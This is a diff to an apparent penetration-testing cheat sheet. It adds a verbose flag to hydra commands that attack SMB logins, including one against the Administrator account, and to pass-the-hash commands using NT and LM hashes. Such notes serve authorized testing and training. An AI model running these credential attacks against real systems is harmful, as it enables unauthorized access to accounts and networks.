@@ -2,13 +2,15 @@
 
 `$ hydra -U smb`
 
-`$ hydra -l Administrator -p <password> smb://<IP>`
+`$ hydra -V -l Administrator -p <password> smb://<IP>`
 
 - Pass the Hash
 
-`$ hydra -l <username> -p <nt_hash> -m "" <IP> smb`
+```
+$ hydra -V -l <username> -p <nt_hash> -m "" <IP> smb
 
-`$ hydra -l <username> -p <lm_hash>:<nt_hash> <IP> -m "LocalHash" smb`
+$ hydra -V -l <username> -p <lm_hash>:<nt_hash> <IP> -m "LocalHash" smb
+```
 
 ---
 ## References
